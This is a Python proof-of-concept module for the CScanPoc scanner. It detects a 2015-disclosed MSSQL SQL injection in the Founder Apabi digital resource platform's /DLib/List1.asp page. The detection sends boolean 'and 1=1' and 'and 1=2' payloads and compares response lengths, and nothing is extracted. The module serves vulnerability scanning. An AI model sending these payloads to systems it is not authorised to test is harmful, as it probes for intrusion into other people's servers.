# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Founder_0001'  # 平台漏洞编号，留空
    name = '方正Apabi数字资源平台MSSQL SQL注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-26'  # 漏洞公布时间
    desc = '''
        北京方正阿帕比技术有限公司是北大方正信息产业集团有限公司旗下专业的数字出版技术及产品提供商。方正阿帕比公司自2001年起进入数字出版领域，在继承并发展方正传统出版印刷技术优势的基础上，自主研发了数字出版技术及整体解决方案，已发展成为全球领先的数字出版技术提供商。
        方正Apabi数字资源平台 /DLib/List1.asp 页面：
        /DLib/List1.asp?lang=gb&act=CategoryBrowse&DocGroupID=2&CategoryTypeID=1 存在MSSQL SQL注射漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0103712'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '方正Apabi数字资源平台'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'af7872d9-ea51-4057-b723-39137733f561'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            # No.1 http://www.wooyun.org/bugs/wooyun-2010-0103712
            payload1 = "/DLib/List1.asp?lang=gb&act=CategoryBrowse&DocGroupID=2&CategoryTypeID=1%20and%20%1=1&BrowseID=1&BrowseName=%BC%C6%CB%E3%BB%FA%CD%F8%C2%E7"
            payload2 = "/DLib/List1.asp?lang=gb&act=CategoryBrowse&DocGroupID=2&CategoryTypeID=1%20and%20%1=2&BrowseID=1&BrowseName=%BC%C6%CB%E3%BB%FA%CD%F8%C2%E7"
            code1, head1, body1, errcode1, final_url1 = hh.http(
                self.target + payload1)
            code2, head2, body2, errcode2, final_url2 = hh.http(
                self.target + payload2)
            if code1 == 200 and code2 == 200 and len(body1) != len(body2):
                # security_hole(arg+payload1)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
